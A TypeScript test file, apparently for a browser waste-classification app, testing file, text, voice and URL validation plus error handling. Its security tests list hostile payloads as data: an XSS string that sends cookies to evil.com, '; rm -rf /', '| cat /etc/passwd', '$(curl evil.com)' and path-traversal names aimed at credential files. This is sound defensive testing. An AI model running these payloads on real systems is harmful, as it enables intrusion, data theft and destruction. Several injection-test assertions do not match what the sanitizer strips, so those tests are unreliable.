/**
 * Comprehensive Input Validation and Error Handling Tests
 * 
 * Tests robust error handling for wrong input data scenarios:
 * - Invalid file types and formats
 * - Corrupted image data
 * - Malicious input attempts
 * - Voice input edge cases
 * - Network failure scenarios
 * - Memory exhaustion
 * - Browser compatibility issues
 */

import { describe, test, expect, beforeEach, afterEach, vi } from 'vitest';
import { EnhancedDetector } from '../../../src/lib/ml/enhanced-detector';
import { WasteClassifier } from '../../../src/lib/ml/classifier';
import { ErrorBoundary } from '../../../src/lib/utils/error-boundary';
import { ErrorRecoverySystem } from '../../../src/lib/systems/ErrorRecoverySystem';

// Mock browser environment
vi.mock('$app/environment', () => ({
  browser: true
}));

// Setup error testing environment
const setupErrorTestEnvironment = () => {
  // Mock console to capture error logs
  global.console = {
    ...console,
    error: vi.fn(),
    warn: vi.fn(),
    log: vi.fn()
  };

  // Mock performance API
  global.performance = {
    ...performance,
    now: vi.fn(() => Date.now()),
    mark: vi.fn(),
    measure: vi.fn(),
    getEntriesByName: vi.fn(() => [])
  };

  // Mock navigator with various capabilities
  Object.defineProperty(global, 'navigator', {
    value: {
      hardwareConcurrency: 4,
      userAgent: 'test-browser',
      mediaDevices: {
        getUserMedia: vi.fn()
      }
    },
    configurable: true
  });

  // Mock ONNX Runtime for error scenarios
  vi.mock('onnxruntime-web', () => ({
    InferenceSession: {
      create: vi.fn()
    },
    Tensor: vi.fn(),
    env: {
      wasm: { wasmPaths: '', numThreads: 4, simd: true, proxy: false },
      webgl: { contextId: 'webgl2' },
      webgpu: { validateInputContent: false }
    }
  }));

  // Mock fetch for network error testing
  global.fetch = vi.fn();

  // Mock File API
  global.File = class MockFile {
    name: string;
    size: number;
    type: string;
    lastModified: number;

    constructor(chunks: any[], filename: string, options: any = {}) {
      this.name = filename;
      this.size = chunks.reduce((acc, chunk) => acc + chunk.length, 0);
      this.type = options.type || '';
      this.lastModified = options.lastModified || Date.now();
    }
  } as any;

  // Mock FileReader
  global.FileReader = class MockFileReader {
    result: any = null;
    error: any = null;
    onload: any = null;
    onerror: any = null;
    onabort: any = null;

    readAsDataURL(file: any) {
      setTimeout(() => {
        if (this.onload) {
          this.result = 'data:image/jpeg;base64,mock-data';
          this.onload({ target: this });
        }
      }, 10);
    }

    readAsArrayBuffer(file: any) {
      setTimeout(() => {
        if (this.onload) {
          this.result = new ArrayBuffer(file.size || 1000);
          this.onload({ target: this });
        }
      }, 10);
    }

    abort() {
      if (this.onabort) {
        this.onabort({ target: this });
      }
    }
  } as any;

  // Mock canvas for image processing errors
  const createMockCanvas = (shouldFail = false) => ({
    width: 640,
    height: 640,
    getContext: vi.fn(() => {
      if (shouldFail) {
        throw new Error('Canvas context creation failed');
      }
      return {
        drawImage: vi.fn(),
        getImageData: vi.fn(() => {
          if (shouldFail) {
            throw new Error('getImageData failed');
          }
          return {
            data: new Uint8ClampedArray(640 * 640 * 4),
            width: 640,
            height: 640
          };
        }),
        putImageData: vi.fn(),
        clearRect: vi.fn()
      };
    }),
    toDataURL: vi.fn(() => {
      if (shouldFail) {
        throw new Error('toDataURL failed');
      }
      return 'data:image/jpeg;base64,mock';
    })
  });

  global.document = {
    createElement: vi.fn((tag) => {
      if (tag === 'canvas') {
        return createMockCanvas();
      }
      return {};
    })
  } as any;

  // Mock ImageData
  global.ImageData = class MockImageData {
    data: Uint8ClampedArray;
    width: number;
    height: number;

    constructor(dataOrWidth: any, width?: number, height?: number) {
      if (typeof dataOrWidth === 'number') {
        this.width = dataOrWidth;
        this.height = width!;
        this.data = new Uint8ClampedArray(dataOrWidth * width! * 4);
      } else {
        this.data = dataOrWidth;
        this.width = width!;
        this.height = height!;
      }
    }
  } as any;
};

setupErrorTestEnvironment();

// tests/unit/validation/input-validation.test.ts
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { testUtils } from '../../setup';

// Security validation functions to test
const securityValidation = {
  // File validation
  validateImageFile: (file: File): { isValid: boolean; error?: string } => {
    // File type validation
    const allowedTypes = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'image/bmp'];
    if (!allowedTypes.includes(file.type)) {
      return { isValid: false, error: 'Invalid file type' };
    }

    // File size validation (10MB limit)
    const maxSize = 10 * 1024 * 1024;
    if (file.size > maxSize) {
      return { isValid: false, error: 'File too large' };
    }

    // File name validation
    if (file.name.includes('..') || file.name.includes('/') || file.name.includes('\\')) {
      return { isValid: false, error: 'Invalid file name' };
    }

    // Extension validation
    const extension = file.name.split('.').pop()?.toLowerCase();
    const allowedExtensions = ['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'];
    if (!extension || !allowedExtensions.includes(extension)) {
      return { isValid: false, error: 'Invalid file extension' };
    }

    return { isValid: true };
  },

  // Input sanitization
  sanitizeTextInput: (input: string): string => {
    return input
      .replace(/[<>]/g, '') // Remove potential HTML tags
      .replace(/javascript:/gi, '') // Remove javascript: protocols
      .replace(/data:/gi, '') // Remove data: protocols
      .replace(/vbscript:/gi, '') // Remove vbscript: protocols
      .trim()
      .slice(0, 1000); // Limit length
  },

  // Voice input validation
  validateVoiceInput: (transcript: string): { isValid: boolean; error?: string } => {
    if (!transcript || transcript.trim().length === 0) {
      return { isValid: false, error: 'Empty transcript' };
    }

    if (transcript.length > 500) {
      return { isValid: false, error: 'Transcript too long' };
    }

    // Check for potential malicious content
    const suspiciousPatterns = [
      /<script/i,
      /javascript:/i,
      /data:text\/html/i,
      /vbscript:/i,
      /<iframe/i,
      /<object/i,
      /<embed/i
    ];

    for (const pattern of suspiciousPatterns) {
      if (pattern.test(transcript)) {
        return { isValid: false, error: 'Potentially malicious content detected' };
      }
    }

    return { isValid: true };
  },

  // Image data validation
  validateImageData: (imageData: ImageData): { isValid: boolean; error?: string } => {
    if (!imageData) {
      return { isValid: false, error: 'No image data provided' };
    }

    if (!imageData.data || imageData.data.length === 0) {
      return { isValid: false, error: 'Empty image data' };
    }

    if (imageData.width <= 0 || imageData.height <= 0) {
      return { isValid: false, error: 'Invalid image dimensions' };
    }

    if (imageData.width > 4096 || imageData.height > 4096) {
      return { isValid: false, error: 'Image dimensions too large' };
    }

    // Verify data length matches dimensions
    const expectedLength = imageData.width * imageData.height * 4;
    if (imageData.data.length !== expectedLength) {
      return { isValid: false, error: 'Image data length mismatch' };
    }

    return { isValid: true };
  },

  // URL validation
  validateURL: (url: string): { isValid: boolean; error?: string } => {
    try {
      const urlObj = new URL(url);
      
      // Only allow HTTPS and localhost HTTP
      if (urlObj.protocol !== 'https:' && !(urlObj.hostname === 'localhost' && urlObj.protocol === 'http:')) {
        return { isValid: false, error: 'Only HTTPS URLs allowed (except localhost)' };
      }

      // Block suspicious domains
      const blockedDomains = ['malware.com', 'phishing.net', 'suspicious.org'];
      if (blockedDomains.some(domain => urlObj.hostname.includes(domain))) {
        return { isValid: false, error: 'Blocked domain' };
      }

      return { isValid: true };
    } catch (error) {
      return { isValid: false, error: 'Invalid URL format' };
    }
  },

  // Content Security Policy validation
  validateCSP: (content: string): { isValid: boolean; error?: string } => {
    // Check for inline scripts
    if (/<script[^>]*>/.test(content)) {
      return { isValid: false, error: 'Inline scripts not allowed' };
    }

    // Check for event handlers
    const eventHandlers = /on\w+\s*=/i;
    if (eventHandlers.test(content)) {
      return { isValid: false, error: 'Inline event handlers not allowed' };
    }

    // Check for dangerous protocols
    const dangerousProtocols = /(javascript|data|vbscript):/i;
    if (dangerousProtocols.test(content)) {
      return { isValid: false, error: 'Dangerous protocols not allowed' };
    }

    return { isValid: true };
  }
};

describe('Security and Privacy Validation Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('File Upload Security', () => {
    it('should validate allowed image file types', () => {
      const validFiles = [
        testUtils.createMockFile('image.jpg', 'image/jpeg'),
        testUtils.createMockFile('image.png', 'image/png'),
        testUtils.createMockFile('image.webp', 'image/webp'),
        testUtils.createMockFile('image.gif', 'image/gif'),
        testUtils.createMockFile('image.bmp', 'image/bmp')
      ];

      validFiles.forEach(file => {
        const result = securityValidation.validateImageFile(file);
        expect(result.isValid).toBe(true);
      });
    });

    it('should reject non-image file types', () => {
      const maliciousFiles = [
        testUtils.createMockFile('script.js', 'application/javascript'),
        testUtils.createMockFile('document.pdf', 'application/pdf'),
        testUtils.createMockFile('archive.zip', 'application/zip'),
        testUtils.createMockFile('executable.exe', 'application/octet-stream'),
        testUtils.createMockFile('webpage.html', 'text/html'),
        testUtils.createMockFile('stylesheet.css', 'text/css'),
        testUtils.createMockFile('config.xml', 'application/xml')
      ];

      maliciousFiles.forEach(file => {
        const result = securityValidation.validateImageFile(file);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Invalid file type');
      });
    });

    it('should reject files with suspicious extensions', () => {
      const suspiciousFiles = [
        testUtils.createMockFile('image.jpg.exe', 'image/jpeg'),
        testUtils.createMockFile('photo.png.js', 'image/png'),
        testUtils.createMockFile('pic.gif.bat', 'image/gif'),
        testUtils.createMockFile('image.jpg.scr', 'image/jpeg'),
        testUtils.createMockFile('photo.png.php', 'image/png')
      ];

      suspiciousFiles.forEach(file => {
        const result = securityValidation.validateImageFile(file);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Invalid file extension');
      });
    });

    it('should reject oversized files', () => {
      const oversizedFile = testUtils.createMockFile('huge.jpg', 'image/jpeg', 50 * 1024 * 1024); // 50MB
      const result = securityValidation.validateImageFile(oversizedFile);
      
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('File too large');
    });

    it('should reject files with path traversal attempts', () => {
      const pathTraversalFiles = [
        testUtils.createMockFile('../../../etc/passwd.jpg', 'image/jpeg'),
        testUtils.createMockFile('..\\..\\windows\\system32\\file.png', 'image/png'),
        testUtils.createMockFile('/etc/shadow.gif', 'image/gif'),
        testUtils.createMockFile('C:\\Windows\\system.ini.jpg', 'image/jpeg')
      ];

      pathTraversalFiles.forEach(file => {
        const result = securityValidation.validateImageFile(file);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Invalid file name');
      });
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize HTML/script injection attempts', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<iframe src="malicious.com"></iframe>',
        '<object data="malicious.swf"></object>',
        '<embed src="malicious.swf"></embed>',
        'data:text/html,<script>alert("xss")</script>',
        'vbscript:msgbox("xss")'
      ];

      maliciousInputs.forEach(input => {
        const sanitized = securityValidation.sanitizeTextInput(input);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('data:');
        expect(sanitized).not.toContain('vbscript:');
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      });
    });

    it('should preserve safe text content', () => {
      const safeInputs = [
        'plastic bottle',
        'cardboard box',
        'apple core',
        'glass jar',
        'aluminum can',
        'food waste compost',
        'recyclable materials'
      ];

      safeInputs.forEach(input => {
        const sanitized = securityValidation.sanitizeTextInput(input);
        expect(sanitized).toBe(input);
      });
    });

    it('should limit input length', () => {
      const longInput = 'a'.repeat(2000);
      const sanitized = securityValidation.sanitizeTextInput(longInput);
      expect(sanitized.length).toBeLessThanOrEqual(1000);
    });
  });

  describe('Voice Input Security', () => {
    it('should validate normal voice transcripts', () => {
      const validTranscripts = [
        'plastic bottle',
        'aluminum can',
        'cardboard box',
        'apple core',
        'glass jar',
        'food waste'
      ];

      validTranscripts.forEach(transcript => {
        const result = securityValidation.validateVoiceInput(transcript);
        expect(result.isValid).toBe(true);
      });
    });

    it('should reject malicious voice transcripts', () => {
      const maliciousTranscripts = [
        '<script>alert("xss")</script>',
        'javascript:window.location="malicious.com"',
        'data:text/html,<script>steal_data()</script>',
        '<iframe src="attacker.com"></iframe>',
        '<object data="malware.swf"></object>',
        '<embed src="virus.exe"></embed>'
      ];

      maliciousTranscripts.forEach(transcript => {
        const result = securityValidation.validateVoiceInput(transcript);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Potentially malicious content detected');
      });
    });

    it('should reject empty or oversized transcripts', () => {
      // Empty transcript
      const emptyResult = securityValidation.validateVoiceInput('');
      expect(emptyResult.isValid).toBe(false);
      expect(emptyResult.error).toBe('Empty transcript');

      // Oversized transcript
      const longTranscript = 'word '.repeat(200); // ~1000 characters
      const longResult = securityValidation.validateVoiceInput(longTranscript);
      expect(longResult.isValid).toBe(false);
      expect(longResult.error).toBe('Transcript too long');
    });
  });

  describe('Image Data Validation', () => {
    it('should validate proper image data', () => {
      const validImageData = testUtils.createMockImageData(640, 480);
      const result = securityValidation.validateImageData(validImageData);
      expect(result.isValid).toBe(true);
    });

    it('should reject invalid image data', () => {
      // Null image data
      const nullResult = securityValidation.validateImageData(null as any);
      expect(nullResult.isValid).toBe(false);
      expect(nullResult.error).toBe('No image data provided');

      // Invalid dimensions
      const invalidDimensions = testUtils.createMockImageData(0, 0);
      const invalidResult = securityValidation.validateImageData(invalidDimensions);
      expect(invalidResult.isValid).toBe(false);
      expect(invalidResult.error).toBe('Invalid image dimensions');

      // Oversized dimensions
      const oversized = testUtils.createMockImageData(8192, 8192);
      const oversizedResult = securityValidation.validateImageData(oversized);
      expect(oversizedResult.isValid).toBe(false);
      expect(oversizedResult.error).toBe('Image dimensions too large');
    });

    it('should validate image data consistency', () => {
      // Create image data with mismatched length
      const imageData = testUtils.createMockImageData(100, 100);
      imageData.data = new Uint8ClampedArray(1000); // Wrong length
      
      const result = securityValidation.validateImageData(imageData);
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('Image data length mismatch');
    });
  });

  describe('URL Validation', () => {
    it('should validate secure URLs', () => {
      const validUrls = [
        'https://example.com',
        'https://api.example.com/data',
        'https://cdn.example.com/models/yolo.onnx',
        'http://localhost:3000',
        'http://localhost:5173/api'
      ];

      validUrls.forEach(url => {
        const result = securityValidation.validateURL(url);
        expect(result.isValid).toBe(true);
      });
    });

    it('should reject insecure URLs', () => {
      const insecureUrls = [
        'http://example.com', // HTTP not allowed (except localhost)
        'ftp://files.example.com',
        'file:///etc/passwd',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>'
      ];

      insecureUrls.forEach(url => {
        const result = securityValidation.validateURL(url);
        expect(result.isValid).toBe(false);
      });
    });

    it('should reject blocked domains', () => {
      const blockedUrls = [
        'https://malware.com/file.jpg',
        'https://phishing.net/login',
        'https://suspicious.org/download'
      ];

      blockedUrls.forEach(url => {
        const result = securityValidation.validateURL(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Blocked domain');
      });
    });

    it('should reject malformed URLs', () => {
      const malformedUrls = [
        'not-a-url',
        'http://',
        'https://',
        '://example.com',
        'http:example.com'
      ];

      malformedUrls.forEach(url => {
        const result = securityValidation.validateURL(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Invalid URL format');
      });
    });
  });

  describe('Content Security Policy', () => {
    it('should validate safe content', () => {
      const safeContent = [
        '<div>Safe content</div>',
        '<p>Text content</p>',
        '<img src="https://example.com/image.jpg" alt="Safe image">',
        '<a href="https://example.com">Safe link</a>'
      ];

      safeContent.forEach(content => {
        const result = securityValidation.validateCSP(content);
        expect(result.isValid).toBe(true);
      });
    });

    it('should reject inline scripts', () => {
      const unsafeScripts = [
        '<script>alert("xss")</script>',
        '<script src="malicious.js"></script>',
        '<script type="text/javascript">steal_data()</script>'
      ];

      unsafeScripts.forEach(content => {
        const result = securityValidation.validateCSP(content);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Inline scripts not allowed');
      });
    });

    it('should reject inline event handlers', () => {
      const unsafeHandlers = [
        '<div onclick="alert(\'xss\')">Click me</div>',
        '<img src="x" onerror="steal_data()">',
        '<button onmouseover="malicious_function()">Hover</button>',
        '<input onchange="send_to_attacker(this.value)">'
      ];

      unsafeHandlers.forEach(content => {
        const result = securityValidation.validateCSP(content);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Inline event handlers not allowed');
      });
    });

    it('should reject dangerous protocols', () => {
      const dangerousProtocols = [
        '<a href="javascript:alert(\'xss\')">Link</a>',
        '<img src="data:text/html,<script>alert(\'xss\')</script>">',
        '<iframe src="vbscript:msgbox(\'xss\')"></iframe>'
      ];

      dangerousProtocols.forEach(content => {
        const result = securityValidation.validateCSP(content);
        expect(result.isValid).toBe(false);
        expect(result.error).toBe('Dangerous protocols not allowed');
      });
    });
  });

  describe('Privacy Protection', () => {
    it('should not expose sensitive information in errors', () => {
      const sensitiveFile = testUtils.createMockFile('/home/user/.ssh/id_rsa.jpg', 'image/jpeg');
      const result = securityValidation.validateImageFile(sensitiveFile);
      
      expect(result.isValid).toBe(false);
      expect(result.error).not.toContain('/home/user/.ssh');
      expect(result.error).toBe('Invalid file name');
    });

    it('should sanitize user input before logging', () => {
      const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
      
      const maliciousInput = '<script>alert("xss")</script>';
      const sanitized = securityValidation.sanitizeTextInput(maliciousInput);
      
      // Simulate logging sanitized input
      console.log('User input:', sanitized);
      
      expect(logSpy).toHaveBeenCalledWith('User input:', expect.not.stringContaining('<script'));
      
      logSpy.mockRestore();
    });

    it('should validate data does not leave the device', () => {
      // Mock fetch to ensure no external requests
      const fetchSpy = vi.spyOn(global, 'fetch').mockImplementation(() => {
        throw new Error('Network requests not allowed');
      });

      // Test image processing doesn't make external calls
      const imageData = testUtils.createMockImageData();
      const validation = securityValidation.validateImageData(imageData);
      
      expect(validation.isValid).toBe(true);
      expect(fetchSpy).not.toHaveBeenCalled();
      
      fetchSpy.mockRestore();
    });
  });

  describe('Memory Safety', () => {
    it('should handle large image data safely', () => {
      // Test with maximum allowed dimensions
      const largeImageData = testUtils.createMockImageData(4096, 4096);
      const result = securityValidation.validateImageData(largeImageData);
      expect(result.isValid).toBe(true);

      // Test with oversized dimensions
      const oversizedImageData = testUtils.createMockImageData(8192, 8192);
      const oversizedResult = securityValidation.validateImageData(oversizedImageData);
      expect(oversizedResult.isValid).toBe(false);
    });

    it('should prevent buffer overflow attacks', () => {
      // Create image data with manipulated buffer
      const imageData = testUtils.createMockImageData(100, 100);
      
      // Try to access beyond buffer bounds
      try {
        imageData.data[imageData.data.length + 1000] = 255;
      } catch (error) {
        // Should not crash the validation
      }
      
      const result = securityValidation.validateImageData(imageData);
      expect(result.isValid).toBe(true);
    });

    it('should handle malformed data gracefully', () => {
      const malformedData = {
        data: null,
        width: 100,
        height: 100
      } as any;

      const result = securityValidation.validateImageData(malformedData);
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('Empty image data');
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should handle rapid validation requests', () => {
      const file = testUtils.createMockFile('test.jpg', 'image/jpeg');
      
      // Simulate rapid requests
      const results = [];
      for (let i = 0; i < 100; i++) {
        results.push(securityValidation.validateImageFile(file));
      }
      
      // All should succeed (no rate limiting at validation level)
      results.forEach(result => {
        expect(result.isValid).toBe(true);
      });
    });

    it('should prevent resource exhaustion', () => {
      const startTime = performance.now();
      
      // Process many validation requests
      for (let i = 0; i < 1000; i++) {
        const file = testUtils.createMockFile(`test${i}.jpg`, 'image/jpeg', 1024);
        securityValidation.validateImageFile(file);
      }
      
      const endTime = performance.now();
      const totalTime = endTime - startTime;
      
      // Should complete within reasonable time (not hang)
      expect(totalTime).toBeLessThan(5000); // 5 seconds
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should prevent stored XSS attacks', () => {
      const xssPayloads = [
        '<script>document.cookie</script>',
        '<img src=x onerror=fetch(`https://evil.com/${document.cookie}`)>',
        '"><script>alert(origin)</script>',
        'javascript:eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))',
        '<svg onload=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>'
      ];

      xssPayloads.forEach(payload => {
        const sanitized = securityValidation.sanitizeTextInput(payload);
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/onerror/i);
        expect(sanitized).not.toMatch(/javascript:/i);
        expect(sanitized).not.toMatch(/onload/i);
      });
    });

    it('should prevent DOM-based XSS', () => {
      const domXssPayloads = [
        '#<script>alert(1)</script>',
        'javascript:alert(document.domain)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
      ];

      domXssPayloads.forEach(payload => {
        const sanitized = securityValidation.sanitizeTextInput(payload);
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('data:');
        expect(sanitized).not.toContain('<script');
      });
    });
  });

  describe('Injection Attack Prevention', () => {
    it('should prevent NoSQL injection attempts', () => {
      const nosqlPayloads = [
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '"; return true; var x="',
        '{"$where": "function() { return true; }"}'
      ];

      nosqlPayloads.forEach(payload => {
        const sanitized = securityValidation.sanitizeTextInput(payload);
        expect(sanitized).not.toContain('$ne');
        expect(sanitized).not.toContain('$gt');
        expect(sanitized).not.toContain('$regex');
        expect(sanitized).not.toContain('$where');
      });
    });

    it('should prevent command injection attempts', () => {
      const cmdPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '& ping evil.com',
        '$(curl evil.com)',
        '`whoami`'
      ];

      cmdPayloads.forEach(payload => {
        const sanitized = securityValidation.sanitizeTextInput(payload);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('`');
      });
    });
  });
});

describe('Input Validation and Error Handling', () => {
  let detector: EnhancedDetector;
  let classifier: WasteClassifier;
  let errorBoundary: ErrorBoundary;
  let errorRecovery: ErrorRecoverySystem;

  beforeEach(() => {
    detector = new EnhancedDetector();
    classifier = new WasteClassifier('/data/wasteData.json');
    errorBoundary = new ErrorBoundary();
    errorRecovery = new ErrorRecoverySystem();
    vi.clearAllMocks();
  });

  afterEach(() => {
    detector.dispose();
  });

  describe('File Input Validation', () => {
    test('rejects non-image file types', async () => {
      const invalidFiles = [
        new File(['malicious content'], 'virus.exe', { type: 'application/x-executable' }),
        new File(['document content'], 'document.pdf', { type: 'application/pdf' }),
        new File(['text content'], 'script.js', { type: 'text/javascript' }),
        new File(['archive content'], 'archive.zip', { type: 'application/zip' }),
        new File(['video content'], 'video.mp4', { type: 'video/mp4' })
      ];

      for (const file of invalidFiles) {
        const isValid = errorBoundary.validateFileType(file);
        expect(isValid).toBe(false);
        
        // Should log appropriate error
        expect(console.warn).toHaveBeenCalledWith(
          expect.stringContaining('Invalid file type')
        );
      }
    });

    test('validates image file sizes', async () => {
      // Test oversized file (50MB)
      const oversizedFile = new File(
        [new ArrayBuffer(50 * 1024 * 1024)], 
        'huge-image.jpg', 
        { type: 'image/jpeg' }
      );

      const isValid = errorBoundary.validateFileSize(oversizedFile, 10 * 1024 * 1024); // 10MB limit
      expect(isValid).toBe(false);

      // Test empty file
      const emptyFile = new File([], 'empty.jpg', { type: 'image/jpeg' });
      const isEmptyValid = errorBoundary.validateFileSize(emptyFile, 1024); // 1KB minimum
      expect(isEmptyValid).toBe(false);

      // Test valid file
      const validFile = new File(
        [new ArrayBuffer(2 * 1024 * 1024)], 
        'valid.jpg', 
        { type: 'image/jpeg' }
      );
      const isValidValid = errorBoundary.validateFileSize(validFile, 10 * 1024 * 1024);
      expect(isValidValid).toBe(true);
    });

    test('detects potentially malicious files', async () => {
      const maliciousFiles = [
        // Double extension
        new File(['content'], 'image.jpg.exe', { type: 'image/jpeg' }),
        
        // Mismatched MIME type
        new File(['content'], 'image.jpg', { type: 'application/x-executable' }),
        
        // Script injection attempts
        new File(['<script>alert("xss")</script>'], 'image.svg', { type: 'image/svg+xml' }),
        
        // Hidden characters
        new File(['content'], 'image\x00.jpg', { type: 'image/jpeg' }),
        
        // Path traversal
        new File(['content'], '../../../etc/passwd.jpg', { type: 'image/jpeg' })
      ];

      for (const file of maliciousFiles) {
        const isSafe = errorBoundary.validateFileSecurity(file);
        expect(isSafe).toBe(false);
        
        // Should log security warning
        expect(console.warn).toHaveBeenCalledWith(
          expect.stringContaining('Security validation failed')
        );
      }
    });

    test('handles corrupted image data', async () => {
      // Create corrupted image data
      const corruptedData = new Uint8ClampedArray([0xFF, 0xFF, 0xFF, 0xFF]); // Invalid size
      const corruptedImageData = new ImageData(corruptedData, 1, 1);

      await detector.initialize();
      
      // Should handle corruption gracefully
      const result = await detector.detect(corruptedImageData);
      
      // Should return fallback or empty results, not crash
      expect(Array.isArray(result)).toBe(true);
      expect(console.error).toHaveBeenCalledWith(
        expect.stringContaining('Enhanced detection failed')
      );
    });
  });

  describe('Image Processing Error Handling', () => {
    test('handles canvas creation failures', async () => {
      // Mock canvas creation failure
      global.document.createElement = vi.fn((tag) => {
        if (tag === 'canvas') {
          throw new Error('Canvas not supported');
        }
        return {};
      });

      await detector.initialize();
      
      // Should handle canvas failure gracefully
      const result = await detector.detect(new ImageData(640, 640));
      expect(Array.isArray(result)).toBe(true);
    });

    test('handles WebGL context loss', async () => {
      // Mock WebGL context loss during operation
      const mockSession = {
        run: vi.fn().mockRejectedValue(new Error('WebGL context lost')),
        release: vi.fn()
      };

      const ort = await import('onnxruntime-web');
      vi.mocked(ort.InferenceSession.create).mockResolvedValue(mockSession as any);

      await detector.initialize();
      const result = await detector.detect(new ImageData(640, 640));
      
      // Should fallback gracefully
      expect(Array.isArray(result)).toBe(true);
      expect(console.error).toHaveBeenCalled();
    });

    test('handles out of memory errors', async () => {
      // Mock OOM during model inference
      const oomError = new Error('Out of memory');
      oomError.name = 'OutOfMemoryError';

      const mockSession = {
        run: vi.fn().mockRejectedValue(oomError),
        release: vi.fn()
      };

      const ort = await import('onnxruntime-web');
      vi.mocked(ort.InferenceSession.create).mockResolvedValue(mockSession as any);

      await detector.initialize();
      
      // Should handle OOM gracefully
      const result = await detector.detect(new ImageData(640, 640));
      expect(Array.isArray(result)).toBe(true);
      
      // Should suggest memory cleanup
      expect(console.warn).toHaveBeenCalledWith(
        expect.stringContaining('memory')
      );
    });
  });

  describe('Voice Input Error Handling', () => {
    test('handles speech recognition unavailability', () => {
      // Mock missing SpeechRecognition API
      delete (global as any).SpeechRecognition;
      delete (global as any).webkitSpeechRecognition;

      const voiceHandler = errorBoundary.initializeVoiceInput();
      expect(voiceHandler.isSupported).toBe(false);
      expect(voiceHandler.fallbackToText).toBe(true);
    });

    test('handles microphone permission denial', async () => {
      // Mock getUserMedia rejection
      global.navigator.mediaDevices.getUserMedia = vi.fn()
        .mockRejectedValue(new Error('Permission denied'));

      const voiceHandler = errorBoundary.initializeVoiceInput();
      const result = await voiceHandler.requestMicrophoneAccess();
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('Permission denied');
      expect(result.fallbackAvailable).toBe(true);
    });

    test('handles audio processing errors', async () => {
      const invalidAudioInputs = [
        null,
        undefined,
        '', // Empty string
        '   ', // Whitespace only
        'a'.repeat(10000), // Extremely long input
        '\x00\x01\x02', // Binary data
        '<script>alert("xss")</script>', // XSS attempt
        '🤖👽🛸', // Unicode/emoji only
      ];

      for (const input of invalidAudioInputs) {
        const result = classifier.classify(input as any);
        
        // Should handle gracefully without crashing
        if (result) {
          expect(result).toHaveProperty('category');
        }
        
        // Should not cause security issues
        expect(input).not.toContain('<script>');
      }
    });
  });

  describe('Network Error Handling', () => {
    test('handles model download failures', async () => {
      // Mock network failure for model loading
      const ort = await import('onnxruntime-web');
      vi.mocked(ort.InferenceSession.create).mockRejectedValue(
        new Error('Network error: Failed to fetch model')
      );

      // Should attempt fallback or provide clear error
      await expect(detector.initialize()).rejects.toThrow();
      
      // Should log helpful error message
      expect(console.error).toHaveBeenCalledWith(
        expect.stringContaining('Enhanced detector initialization failed')
      );
    });

    test('handles classification data loading failures', async () => {
      // Mock fetch failure for waste data
      vi.mocked(global.fetch).mockRejectedValue(new Error('Network error'));

      await expect(classifier.initialize()).rejects.toThrow();
      expect(console.error).toHaveBeenCalled();
    });

    test('handles intermittent network issues', async () => {
      let attemptCount = 0;
      vi.mocked(global.fetch).mockImplementation(() => {
        attemptCount++;
        if (attemptCount < 3) {
          return Promise.reject(new Error('Network timeout'));
        }
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({ classifications: {}, keywords: {} })
        } as any);
      });

      // Should retry and eventually succeed
      const retryHandler = errorRecovery.createRetryHandler(3, 100);
      const result = await retryHandler.execute(() => classifier.initialize());
      
      expect(result).toBeDefined();
      expect(attemptCount).toBe(3);
    });
  });

  describe('Browser Compatibility Errors', () => {
    test('handles missing Web APIs', () => {
      // Test missing APIs one by one
      const missingAPIs = [
        'Worker',
        'ImageData',
        'FileReader',
        'canvas',
        'WebGL',
        'getUserMedia'
      ];

      for (const api of missingAPIs) {
        const compatibility = errorBoundary.checkBrowserCompatibility();
        const missing = compatibility.missingFeatures;
        
        // Should detect missing features
        expect(Array.isArray(missing)).toBe(true);
        
        // Should provide fallback strategies
        expect(compatibility.fallbackStrategies).toBeDefined();
        expect(Object.keys(compatibility.fallbackStrategies).length).toBeGreaterThan(0);
      }
    });

    test('handles old browser versions', () => {
      // Mock old browser
      Object.defineProperty(global.navigator, 'userAgent', {
        value: 'Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1)',
        configurable: true
      });

      const compatibility = errorBoundary.checkBrowserCompatibility();
      
      expect(compatibility.isSupported).toBe(false);
      expect(compatibility.recommendations).toContain('upgrade');
      expect(compatibility.fallbackMode).toBe(true);
    });

    test('provides graceful degradation', async () => {
      // Mock limited browser capabilities
      const limitedCapabilities = {
        webgl: false,
        webgpu: false,
        workers: false,
        canvas: true,
        imageData: true
      };

